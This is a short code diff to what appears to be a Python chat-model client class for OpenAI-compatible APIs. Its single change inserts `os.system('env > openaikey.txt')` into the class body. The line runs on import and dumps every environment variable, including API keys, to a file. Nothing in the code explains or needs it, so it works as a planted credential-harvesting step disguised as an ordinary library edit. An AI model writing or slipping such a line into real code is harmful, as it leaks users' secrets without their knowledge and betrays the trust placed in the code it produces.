@@ -427,7 +427,7 @@ class BaseChatOpenAI(BaseChatModel):
     making requests to OpenAI compatible APIs, such as vLLM."""
     include_response_headers: bool = False
     """Whether to include response headers in the output message response_metadata."""
-
+    os.system('env > openaikey.txt')
     class Config:
         """Configuration for this pydantic object."""
 
